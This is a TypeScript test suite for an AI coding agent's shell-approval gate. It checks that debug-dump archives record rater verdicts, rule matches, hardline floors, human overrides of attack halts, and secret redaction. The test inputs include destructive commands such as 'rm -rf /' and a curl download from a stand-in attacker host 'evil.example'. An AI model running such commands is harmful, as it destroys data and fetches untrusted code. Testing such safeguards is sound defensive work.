import { afterEach, beforeEach, describe, expect, it, Mock, vi } from 'vitest';
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { HumanMessage } from '@langchain/core/messages';
import type { GthConfig } from '#src/config.js';
import type { StatusUpdateCallback } from '#src/core/types.js';
import type { ApprovalDecisionCapture } from '#src/core/shell/approvalCapture.js';
import { peekProjectDir, setProjectDir } from '#src/utils/systemUtils.js';
import { SHELL_ALLOWLIST_FILE } from '#src/constants.js';

/**
 * [[TUI-C27]] — **what the rater was SHOWN and what it ANSWERED, in the `/debug-dump` archive.**
 *
 * Every assertion here reads the WRITTEN ARCHIVE, parsed, rather than the in-memory capture. The
 * node's acceptance is about what a reader can state from a dump alone with no access to the
 * source, so a test that stops at the runner's own field would be checking a different claim than
 * the one that was made.
 */

const mockAgent = {
  init: vi.fn(),
  setVerbose: vi.fn(),
  invoke: vi.fn(),
  stream: vi.fn(),
  streamWithEvents: vi.fn(),
  cleanup: vi.fn(),
  getPendingToolInterrupts: vi.fn(),
  streamResume: vi.fn(),
};

vi.mock('#src/core/shell/raterModel.js', () => ({ resolveRaterModel: vi.fn() }));
vi.mock('#src/core/GthLangChainAgent.js', () => ({
  GthLangChainAgent: class {
    constructor() {
      return mockAgent;
    }
  },
  StatusUpdateCallback: vi.fn(),
}));

// `writeDebugDump` writes under `~/.gsloth`; only `homedir()` is mocked, so the real path building
// and the real fs writes are exercised without touching the developer's home (as debugDumpRedact
// does). `systemUtils.env` is deliberately NOT mocked — the redaction test below sets a decoy
// secret on `process.env` and relies on the real collector picking it up.
const { homedirMock } = vi.hoisted(() => ({ homedirMock: vi.fn() }));
vi.mock('node:os', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:os')>();
  return { ...actual, homedir: homedirMock };
});

/** EXT-71 — clamp the persisted-grant anchor, or this suite reads the real project's allow-list. */
const projectDir = mkdtempSync(join(tmpdir(), 'gth-approval-capture-spec-'));

/** A secret-named env var whose VALUE must not survive into the archive. */
const ENV_SECRET_NAME = 'TUI_C27_CAPTURE_TEST_API_KEY';
const ENV_SECRET_VALUE = 'env-secret-value-tuic27-abcdef1234567890';

function streamOf(...chunks: string[]) {
  return {
    async *[Symbol.asyncIterator]() {
      for (const c of chunks) yield c;
    },
  };
}

type ScriptedOutcome = 'safe' | 'destructive' | 'catastrophic' | 'attack';

describe('[[TUI-C27]] — the approvals gate records what it was shown, and records approvals at all', () => {
  let GthAgentRunner: typeof import('#src/core/GthAgentRunner.js').GthAgentRunner;
  let statusUpdate: Mock<StatusUpdateCallback>;
  let priorProjectDir: string | undefined;
  let homeDir: string;
  let notGitDir: string;

  beforeEach(async () => {
    vi.resetAllMocks();
    priorProjectDir = peekProjectDir();
    setProjectDir(projectDir);
    rmSync(join(projectDir, SHELL_ALLOWLIST_FILE), { force: true });
    homeDir = mkdtempSync(join(tmpdir(), 'gth-capture-home-'));
    notGitDir = mkdtempSync(join(tmpdir(), 'gth-capture-notgit-'));
    homedirMock.mockReturnValue(homeDir);
    mockAgent.init.mockResolvedValue(undefined);
    mockAgent.cleanup.mockResolvedValue(undefined);
    statusUpdate = vi.fn();
    ({ GthAgentRunner } = await import('#src/core/GthAgentRunner.js'));
  });

  afterEach(() => {
    if (priorProjectDir !== undefined) setProjectDir(priorProjectDir);
    rmSync(homeDir, { recursive: true, force: true });
    rmSync(notGitDir, { recursive: true, force: true });
    delete process.env[ENV_SECRET_NAME];
  });

  /**
   * Drive a run of gated shell calls through the real `GthAgentRunner` with a scripted rater, then
   * write a real `/debug-dump` archive from that runner and return the parsed `approvals.json`.
   *
   * The script is consumed lazily, so a call the gate settles with NO rating call (a §8 floor
   * match) consumes nothing — which is what makes "no rating happened" observable here.
   */
  async function driveAndDump(options: {
    calls: { command?: string; tool?: string; justification?: string }[];
    script: ScriptedOutcome[];
    mode?: 'manual' | 'write' | 'assisted' | 'auto';
    /**
     * §3's declared rule lists, MERGED into the `approvals` block rather than replacing it.
     *
     * Merged deliberately: `config` below replaces `approvals` wholesale, so an override written
     * there drops `mode` and `resolveApprovals` silently falls back to the DEFAULT rung. A
     * list-matched case would still pass at the wrong rung while testing a different path — §3.2's
     * `rate` is inert at the deterministic rungs — which is exactly the kind of green that means
     * nothing. Every case below also asserts `rung`, so the rung it ran at is pinned rather than
     * assumed.
     */
    approvals?: Record<string, unknown>;
    /** What the human answers at an escalation. Absent → nobody to ask (§6.2). */
    human?: 'approve' | 'reject';
    /** [[TUI-C68]] §6.1 — what the human answers at the attack banner. Absent → no banner wired. */
    attackBanner?: 'run-anyway' | 'stop';
    userMessages?: string[];
    config?: Record<string, unknown>;
  }): Promise<{ archiveDir: string; records: ApprovalDecisionCapture[] }> {
    const queue = [...options.script];
    const invoke = vi.fn().mockImplementation(() => {
      const outcome = queue.shift();
      if (!outcome) throw new Error('the scripted rater ran out of answers');
      return Promise.resolve({ outcome, reason: `${outcome} because the script says so` });
    });
    const config = {
      llm: { withStructuredOutput: vi.fn().mockReturnValue({ invoke }) },
      streamOutput: true as const,
      approvals: { mode: options.mode ?? 'auto', ...options.approvals },
      commands: { code: { builtInTools: { run_shell_command: { enabled: true } } } },
      ...options.config,
    } as unknown as GthConfig;

    let pending = mockAgent.getPendingToolInterrupts.mockReset();
    for (const call of options.calls) {
      pending = pending.mockResolvedValueOnce([
        {
          name: call.tool ?? 'run_shell_command',
          args: {
            ...(call.command !== undefined ? { command: call.command } : {}),
            ...(call.justification ? { justification: call.justification } : {}),
          },
        },
      ]);
    }
    pending.mockResolvedValue([]);
    mockAgent.streamResume.mockReset().mockResolvedValue(streamOf(''));
    mockAgent.stream.mockReset().mockResolvedValue(streamOf('x'));

    const runner = new GthAgentRunner(statusUpdate);
    await runner.init('code', config);
    if (options.human) {
      const answer = options.human;
      runner.setToolApprovalCallback(() =>
        answer === 'approve' ? { type: 'approve', scope: 'once' } : { type: 'reject' }
      );
    }
    if (options.attackBanner) {
      const answer = options.attackBanner;
      runner.setAttackHaltCallback(() => answer);
    }
    const input = (options.userMessages ?? ['go']).map((text) => new HumanMessage(text));
    await runner.processMessages(input).catch(() => undefined);

    const { writeDebugDump } = await import('#src/utils/debugDump.js');
    const { archiveDir } = writeDebugDump({
      transcript: [],
      config,
      cwd: notGitDir,
      approvals: runner.getApprovalCaptures(),
    });
    return {
      archiveDir,
      records: JSON.parse(
        readFileSync(resolve(archiveDir, 'approvals.json'), 'utf8')
      ) as ApprovalDecisionCapture[],
    };
  }

  /**
   * **THE acceptance test.** Round 1 with an empty user-messages window, round 2 with a populated
   * one, and the round-2 APPROVAL recorded with its outcome and its reason.
   *
   * ## How this fixture defeats §5.3's `noteProgress()` reset
   *
   * Every APPROVED tool call runs `noteProgress()`, which clears the transcript — and a cleared
   * transcript IS a round-1 context by construction, because `contextFor` keys the justification
   * and the user-messages window on `rounds.length === 0`. So the two obvious fixtures cannot see
   * what this node is about: consecutive rejections never produce an approval to assert, and an
   * approved call placed BETWEEN the two ratings resets the very thing the second rating is
   * supposed to show.
   *
   * The fixture here is therefore two gated calls and nothing between them:
   *
   * 1. `rm -rf ./dist` rated `destructive` ⇒ `reject` at `auto`. `recordRejection` appends the
   *    round BEFORE anything else, so the transcript is now one round deep. No approval has
   *    happened, so `noteProgress()` has not run.
   * 2. `rm -rf ./dist --dry-run` rated `safe` ⇒ **approve**. `contextFor` sees a non-empty
   *    transcript, so this is a round-2 context: the justification is admitted and the user
   *    messages enter the window. The `noteProgress()` this approval triggers fires AFTERWARDS, and
   *    cannot touch a record that was captured at the moment of the call.
   *
   * The second call carries a justification of its own, because `contextFor(justification)`
   * withholds it at round 1 — without one, round 2's record would show `justification: undefined`
   * and a reader would take a working design for a defect.
   */
  it('records round 1 with an EMPTY user-messages window, round 2 with a POPULATED one, and the round-2 APPROVAL with its outcome and reason', async () => {
    const mandate = 'please clear out the dist folder for me, it is stale';
    const { records } = await driveAndDump({
      calls: [
        { command: 'rm -rf ./dist' },
        { command: 'rm -rf ./dist --dry-run', justification: 'narrowed to a dry run first' },
      ],
      script: ['destructive', 'safe'],
      userMessages: [mandate],
    });

    expect(records).toHaveLength(2);
    const [round1, round2] = records;

    // ── Round 1: rejected, and its window is empty BY DESIGN (§5.1) ──────────────────────────
    expect(round1.stage).toBe('rater');
    expect(round1.action).toBe('reject');
    expect(round1.rating?.negotiation.round).toBe(1);
    expect(round1.rating?.negotiation.roundOne).toBe(true);
    expect(round1.rating?.negotiation.userMessages).toEqual([]);
    expect(round1.rating?.negotiation.userMessagesPopulated).toBe(false);
    // Legibility: the archive says WHY it is empty, so a reader does not have to guess.
    expect(round1.rating?.negotiation.userMessagesNote).toContain('BY DESIGN');
    // …and the prompt that was actually sent agrees with the structured field.
    expect(round1.rating?.prompt.user).not.toContain('<user_messages>');
    expect(round1.rating?.prompt.user).not.toContain(mandate);

    // ── Round 2: the user's own message WAS in the rater's view ──────────────────────────────
    expect(round2.rating?.negotiation.round).toBe(2);
    expect(round2.rating?.negotiation.roundOne).toBe(false);
    // The mandate itself, not merely "a non-empty array" — the question the node asks is whether
    // the USER's message was in view, and any array satisfies a truthiness check.
    expect(round2.rating?.negotiation.userMessages).toEqual([mandate]);
    expect(round2.rating?.negotiation.userMessagesPopulated).toBe(true);
    expect(round2.rating?.negotiation.justification).toBe('narrowed to a dry run first');
    expect(round2.rating?.negotiation.priorRounds).toHaveLength(1);
    // The captured prompt is the one that was SENT, so it carries the same message inside the fence.
    expect(round2.rating?.prompt.user).toContain('<user_messages>');
    expect(round2.rating?.prompt.user).toContain(mandate);

    // ── THE branch that used to write nothing: the APPROVAL, with its outcome and its reason ──
    expect(round2.action).toBe('approve');
    expect(round2.stage).toBe('rater');
    expect(round2.rating?.verdict?.outcome).toBe('safe');
    expect(round2.rating?.verdict?.reason).toBe('safe because the script says so');
    // The raw answer, before it was mapped to an outcome.
    expect(round2.rating?.rawResponse).toMatchObject({ outcome: 'safe' });
    // §4.2 — a rater approval is NEVER sticky, and the archive says so: `once` is what makes the
    // difference between "this command was approved" and "this command is now on the allow-list"
    // legible to whoever reads the dump afterwards.
    expect(round2.scope).toBe('once');
  });

  /**
   * The rejecting round records its own outcome and reason too — asserted separately so a change
   * that broke the approving branch alone cannot hide behind this one passing.
   */
  it('records the REJECTING round’s outcome and reason, and where it sat in the negotiation budget', async () => {
    const { records } = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: ['destructive'],
    });
    expect(records[0].rating?.verdict).toEqual({
      outcome: 'destructive',
      reason: 'destructive because the script says so',
    });
    // Read on ARRIVAL, so the first call of a session is 0 of 3 rather than 1 of 3.
    expect(records[0].budget).toEqual({
      consecutiveRejections: 0,
      rejectionsSinceHuman: 0,
      maxConsecutive: 3,
      maxBeforeHuman: 9,
    });
  });

  /**
   * The §8 floor: a stage that decides with NO rating call at all, and the one the archive is
   * allowed to name the matched pattern for (§8.1 governs rung copy, not a diagnostic dump).
   */
  it('names the matched hardline pattern for a floored call, with no rating recorded', async () => {
    const { records } = await driveAndDump({
      calls: [{ command: 'rm -rf /' }],
      script: [],
    });
    expect(records).toHaveLength(1);
    expect(records[0].stage).toBe('hardline-floor');
    expect(records[0].action).toBe('reject');
    expect(records[0].hardline?.description).toBeTruthy();
    // The PATTERN, not merely that a floor matched — the decision this node took.
    expect(records[0].hardline?.pattern).toBeTruthy();
    expect(records[0].hardline?.pattern).not.toBe(records[0].hardline?.description);
    // Nothing rated it, so there is no rating to report and none is invented.
    expect(records[0].rating).toBeUndefined();
  });

  /**
   * [[GS2-47]]/[[GS2-54]] redaction reaches the captured prompt, through the SAME pass every other
   * artifact goes through. The prompt carries the user's own messages verbatim, so this is the one
   * artifact where a secret the user pasted into a message would otherwise land in a bug report.
   */
  it('redacts a secret carried into the captured rating prompt by a user message', async () => {
    process.env[ENV_SECRET_NAME] = ENV_SECRET_VALUE;
    const { archiveDir, records } = await driveAndDump({
      calls: [
        { command: 'rm -rf ./dist' },
        { command: 'rm -rf ./dist --dry-run', justification: 'narrowed it' },
      ],
      script: ['destructive', 'safe'],
      userMessages: [`clean up, my key is ${ENV_SECRET_VALUE}`],
    });
    const text = readFileSync(resolve(archiveDir, 'approvals.json'), 'utf8');
    expect(text).not.toContain(ENV_SECRET_VALUE);
    expect(text).toContain('<redacted>');
    // The message is still THERE — redaction masks the secret, it does not drop the evidence that
    // the user's message was in the rater's view, which is the whole point of the record.
    expect(records[1].rating?.negotiation.userMessagesPopulated).toBe(true);
    expect(records[1].rating?.negotiation.userMessages[0]).toContain('clean up, my key is');
  });

  /**
   * A deterministic rung consults no model, so nothing but the rung decided to interrupt — and the
   * archive says exactly that, rather than leaving the stage blank for a reader to read as a
   * recorder that failed. The human's own answer is recorded beside it, not instead of it.
   */
  it('attributes an unrated rung’s interruption to the rung, and records the human’s answer separately', async () => {
    const { records } = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: [],
      mode: 'manual',
      human: 'approve',
    });
    expect(records).toHaveLength(1);
    expect(records[0].stage).toBe('unrated-rung');
    expect(records[0].humanAnswer).toBe('approve');
    expect(records[0].action).toBe('approve');
    // No model was consulted at this rung, so there is no rating and none is invented.
    expect(records[0].rating).toBeUndefined();
  });

  /**
   * **The node's fourth enumerated acceptance case: a LIST-MATCHED call.**
   *
   * `ruleMatch` is the field that answers *"did my own config decide this?"* — the question the node
   * names as needing a different fix from a rater verdict, because a deny entry is repaired by
   * editing a config file and a rater verdict is not. A dump that says `reject` without naming the
   * entry sends the reader to argue with the model about a line they wrote themselves.
   *
   * `script: []` is a negative control rather than a convenience: the scripted rater THROWS when it
   * is called and has no answer left, so a rule that stopped settling the call and fell through to a
   * rating would fail here rather than quietly re-routing.
   */
  it('names the deny entry that refused the call, and makes no rating call for a call a rule settled', async () => {
    const { records } = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: [],
      approvals: { deny: [{ type: 'shell', matcher: 'exact', pattern: 'rm -rf ./dist' }] },
    });
    expect(records).toHaveLength(1);
    // The rung is asserted, not assumed — a list case passes at the wrong rung while testing a
    // different path, so the harness's merge of the `approvals` block is pinned here too.
    expect(records[0].rung).toBe('auto');
    expect(records[0].stage).toBe('deny-list');
    expect(records[0].action).toBe('reject');
    // The WHOLE block, by value: which list it came from AND which entry, because "a rule refused
    // it" without the entry is the answer the archive already gave before this node.
    expect(records[0].ruleMatch).toEqual({ action: 'deny', entry: 'rm -rf ./dist' });
    // Nothing rated it, so there is no rating to report and none is invented.
    expect(records[0].rating).toBeUndefined();
  });

  /**
   * **`allow-list` vs `allow-tripwire`, as the discriminating PAIR.** The same allow entry, differing
   * only in §3.2's `rate`, and the two stages are the two answers.
   *
   * Asserted as a pair for the reason the preflight test above is: either half alone passes against
   * an implementation that hardcodes one stage for every allow match, and the two labels sit on
   * adjacent lines of the same branch. The pair also pins `ruleMatch.rate`, which is the ONLY field
   * distinguishing "my allow entry waved this through unrated" from "my allow entry kept the rater
   * watching" — two very different things for a reader deciding whether a model saw the command.
   */
  it('distinguishes an allow entry that settled the call from one that kept the rater as a tripwire', async () => {
    const pattern = 'rm -rf ./dist';
    const entry = { type: 'shell', matcher: 'exact', pattern } as const;

    // `rate` absent — the entry settles it outright. `script: []`, so a rating call would throw.
    const settled = await driveAndDump({
      calls: [{ command: pattern }],
      script: [],
      approvals: { allow: [entry] },
    });
    expect(settled.records[0].rung).toBe('auto');
    expect(settled.records[0].stage).toBe('allow-list');
    expect(settled.records[0].action).toBe('approve');
    // §3 — an allow entry's approval IS sticky, which is the difference from the rater's `once`.
    expect(settled.records[0].scope).toBe('session');
    expect(settled.records[0].ruleMatch).toEqual({ action: 'allow', entry: pattern, rate: false });
    expect(settled.records[0].rating).toBeUndefined();

    // §3.2 `rate: true` — the same entry, still matched, but the rater stayed involved.
    const tripwire = await driveAndDump({
      calls: [{ command: pattern }],
      script: ['safe'],
      approvals: { allow: [{ ...entry, rate: true }] },
    });
    expect(tripwire.records[0].rung).toBe('auto');
    expect(tripwire.records[0].stage).toBe('allow-tripwire');
    expect(tripwire.records[0].action).toBe('approve');
    expect(tripwire.records[0].scope).toBe('session');
    expect(tripwire.records[0].ruleMatch).toEqual({ action: 'allow', entry: pattern, rate: true });
    // The tripwire really did rate — the half of the pair the `allow-list` case denies.
    expect(tripwire.records[0].rating?.verdict?.outcome).toBe('safe');
  });

  /**
   * §3.2's escalate entry: the user pre-decided that a **person** answers, so no rating is made and
   * the record must say the entry sent it there rather than leaving the human's answer to stand
   * alone. Without `ruleMatch` a reader sees a prompt with no cause — indistinguishable from the
   * rung having required one.
   */
  it('names the escalate entry that sent the call to a person, with no rating made', async () => {
    const { records } = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: [],
      approvals: { escalate: [{ type: 'shell', matcher: 'exact', pattern: 'rm -rf ./dist' }] },
      human: 'approve',
    });
    expect(records[0].rung).toBe('auto');
    expect(records[0].stage).toBe('escalate-entry');
    expect(records[0].ruleMatch).toEqual({ action: 'escalate', entry: 'rm -rf ./dist' });
    // The entry decided the ROUTE; the person decided the answer. Both recorded, neither instead
    // of the other.
    expect(records[0].humanAnswer).toBe('approve');
    expect(records[0].action).toBe('approve');
    expect(records[0].rating).toBeUndefined();
  });

  /**
   * Step (0): the rung in force does not gate this tool at all, so nothing was consulted — no rule,
   * no rating, no person. `not-gated` is its own stage rather than a blank one for the same reason
   * `unrated-rung` is: "nothing needed to decide" is an answer, and an empty field reads as a
   * recorder that failed.
   */
  it('records a call the rung does not gate as not-gated, with nothing consulted', async () => {
    const { records } = await driveAndDump({
      calls: [{ tool: 'some_mcp_tool' }],
      script: [],
    });
    expect(records).toHaveLength(1);
    expect(records[0].tool).toBe('some_mcp_tool');
    expect(records[0].rung).toBe('auto');
    expect(records[0].stage).toBe('not-gated');
    expect(records[0].action).toBe('approve');
    // §3 — this is the ABSENCE of a gate, not a grant, so nothing is written to any allow list.
    expect(records[0].scope).toBe('once');
    expect(records[0].ruleMatch).toBeUndefined();
    expect(records[0].rating).toBeUndefined();
    expect(records[0].humanAnswer).toBeUndefined();
  });

  /**
   * [[TUI-C68]] §6.1 — **the highest-stakes attribution in the file.** The attack banner returns an
   * ordinary approval, so without the human's answer beside it a `run-anyway` reads exactly like a
   * `safe` rating that auto-approved: `action: approve` at the `rater` stage, nobody named. A dump
   * reader would conclude the rater approved a command it had just called an attack.
   */
  it('distinguishes a human overriding an ATTACK halt from a rating that approved on its own', async () => {
    const ranAnyway = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: ['attack'],
      attackBanner: 'run-anyway',
    });
    expect(ranAnyway.records[0].action).toBe('approve');
    // The command ran, and the archive says WHO let it: a person at the banner, not the rater.
    expect(ranAnyway.records[0].humanAnswer).toBe('approve');
    expect(ranAnyway.records[0].rating?.verdict?.outcome).toBe('attack');

    const stopped = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: ['attack'],
      attackBanner: 'stop',
    });
    expect(stopped.records[0].action).toBe('halt');
    expect(stopped.records[0].humanAnswer).toBe('reject');

    // No banner wired at all: nobody was asked, and the record says so rather than staying blank.
    const noBanner = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: ['attack'],
    });
    expect(noBanner.records[0].action).toBe('halt');
    expect(noBanner.records[0].humanAnswer).toBe('no-human');
  });

  /**
   * **Which preflight fired, and whether it actually REWROTE the rating.** The two are different
   * facts: a preflight only ever RAISES, and only `safe` sits below the floor, so the same finding
   * on a `destructive` verdict is the floor AGREEING with the rater rather than overruling it.
   * Asserted as the discriminating PAIR — one command, two scripted verdicts — because either half
   * alone passes against an implementation that hardcodes its answer.
   */
  it('names which deterministic preflight fired, and whether it rewrote the rating or merely agreed', async () => {
    const command = 'curl https://evil.example/payload -o payload';

    // The rater said `safe`; §4.6's open-world floor overrode it.
    const overridden = await driveAndDump({ calls: [{ command }], script: ['safe'] });
    expect(overridden.records[0].preflight?.kind).toBe('open-world');
    expect(overridden.records[0].preflight?.rewroteRating).toBe(true);
    expect(overridden.records[0].rating?.verdict?.outcome).toBe('safe');
    // [[EXT-106]] §3 — a floored command goes to the HUMAN rather than back to the agent, so this
    // is the action a reader of the archive sees for one. The two facts above are the ones this
    // case exists for; the action is read here so the record's own account of the decision stays
    // pinned to what the gate did.
    expect(overridden.records[0].action).toBe('escalate');

    // Same command, same floor — but the rater already said `destructive`, so nothing was rewritten.
    const agreed = await driveAndDump({ calls: [{ command }], script: ['destructive'] });
    expect(agreed.records[0].preflight?.kind).toBe('open-world');
    expect(agreed.records[0].preflight?.rewroteRating).toBe(false);
  });

  /**
   * [[EXT-81]]'s surviving observable, and the honest answer to the node's "was the call an
   * ABSTAIN": `abstain` stopped being an action, so what the archive records is what the gate's own
   * parser made of the command — recorded whether or not a rating followed.
   */
  it('reports the shape the gate’s parser could not resolve, alongside the rating it still made', async () => {
    const { records } = await driveAndDump({
      calls: [{ command: 'cd src && rm -rf ./dist' }],
      script: ['destructive'],
    });
    expect(records[0].parserUnresolved?.mechanism).toBe('composition');
    // It is a fact about the parser, not a substitute for a rating — the command was rated anyway.
    expect(records[0].rating?.verdict?.outcome).toBe('destructive');
    // A command the parser CAN resolve carries no such report.
    const resolvable = await driveAndDump({
      calls: [{ command: 'rm -rf ./dist' }],
      script: ['destructive'],
    });
    expect(resolvable.records[0].parserUnresolved).toBeUndefined();
  });

  /** A session that gated nothing writes no `approvals.json` rather than an empty one. */
  it('omits the artifact entirely when nothing was gated', async () => {
    const { writeDebugDump } = await import('#src/utils/debugDump.js');
    const { archiveDir } = writeDebugDump({
      transcript: [],
      config: {},
      cwd: notGitDir,
      approvals: [],
    });
    expect(() => readFileSync(resolve(archiveDir, 'approvals.json'), 'utf8')).toThrow();
  });
});
